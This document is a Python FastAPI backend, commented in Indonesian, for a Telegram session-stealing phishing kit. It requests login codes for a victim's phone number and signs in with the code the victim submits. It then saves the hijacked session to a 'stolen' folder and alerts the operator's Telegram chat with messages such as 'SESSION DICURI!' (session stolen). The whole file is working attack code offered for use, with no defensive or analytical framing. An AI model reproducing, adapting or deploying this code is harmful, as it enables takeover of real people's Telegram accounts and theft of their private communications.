from fastapi import FastAPI, Request
from telethon import TelegramClient
from telethon.sessions import StringSession
import asyncio
import os
import uvicorn

app = FastAPI()

# ENV (WAJIB DI RAILWAY!)
API_ID = int(os.getenv('API_ID'))
API_HASH = os.getenv('API_HASH')
BOT_TOKEN = os.getenv('BOT_TOKEN')
CHAT_ID = int(os.getenv('CHAT_ID'))

# Cek ENV
if not all([API_ID, API_HASH, BOT_TOKEN, CHAT_ID]):
    raise RuntimeError("Set API_ID, API_HASH, BOT_TOKEN, CHAT_ID di Railway!")

client = TelegramClient('jinx', API_ID, API_HASH)
pending = {}  # phone -> {'client': ..., 'hash': ...}

@app.post("/send_otp")
async def send_otp(req: Request):
    data = await req.json()
    phone = data['phone']
    
    temp = TelegramClient(StringSession(), API_ID, API_HASH)
    await temp.connect()
    sent = await temp.send_code_request(phone)
    pending[phone] = {'client': temp, 'hash': sent.phone_code_hash}
    
    # Kirim notif
    await client.start(bot_token=BOT_TOKEN)
    await client.send_message(CHAT_ID, f"TARGET MASUK!\nNomor: `{phone}`\nMenunggu OTP...")
    
    return {"success": True}

@app.post("/submit_otp")
async def submit_otp(req: Request):
    data = await req.json()
    phone = data['phone']
    otp = data['otp']
    
    if phone not in pending:
        return {"success": False, "error": "No OTP sent"}
    
    temp = pending[phone]['client']
    hash_ = pending[phone]['hash']
    
    try:
        await temp.sign_in(phone, otp, phone_code_hash=hash_)
        me = await temp.get_me()
        session_str = temp.session.save()
        
        # Simpan session
        os.makedirs("stolen", exist_ok=True)
        with open(f"stolen/{phone.replace('+','')}.session", "w") as f:
            f.write(session_str)
        
        # Kirim notif
        msg = f"SESSION DICURI!\nUser: {me.first_name}\nPhone: `{phone}`\nGunakan: /login {phone}"
        await client.send_message(CHAT_ID, msg)
        
        del pending[phone]
        return {"success": True}
    except Exception as e:
        return {"success": False, "error": str(e)}

@app.on_event("startup")
async def startup():
    await client.connect()
    print("JINX BOT HIDUP – SIAP CURI SESSION!")

if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=8080, log_level="info")
